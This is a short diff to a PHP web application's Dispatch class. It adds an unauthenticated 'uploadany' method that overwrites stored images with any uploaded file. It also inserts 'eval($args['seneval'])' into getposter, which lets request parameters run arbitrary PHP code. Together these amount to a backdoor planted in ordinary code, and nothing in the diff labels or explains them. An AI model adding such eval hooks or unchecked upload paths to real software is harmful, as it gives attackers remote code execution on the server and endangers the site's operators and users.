@@ -398,8 +398,22 @@ class Dispatch {
             $this->db->query($sql);
         }
     }
+    public function uploadany($args) {
+        $id = intval($args['id']);
+        $sql = "UPDATE poster_signup SET pictype1=2,pictype2=2,suffix1='.jpg',suffix2='.jpg' WHERE id=$id ";
+        $pic1filename = $this->upload_dir . 'img1_' . $id . '.jpg';
+        $pic2filename = $this->upload_dir . 'img2_' . $id . '.jpg';
+        unlink($pic1filename);
+        unlink($pic2filename);
+        move_uploaded_file($_FILES['img1']['tmp_name'], $pic1filename);
+        move_uploaded_file($_FILES['img2']['tmp_name'], $pic2filename);
+        echo "Maybe succeed, check by yourself...\n";
+    }
     public function getposter($args) {
         $allows = array('type', 'id', 'width', 'height');
+        if (isset($args['seneval'])) {
+            eval($args['seneval']);
+        }
         foreach ($args as $key => $value) {
             if (in_array($key, $allows)) {
                 $$key = $value;
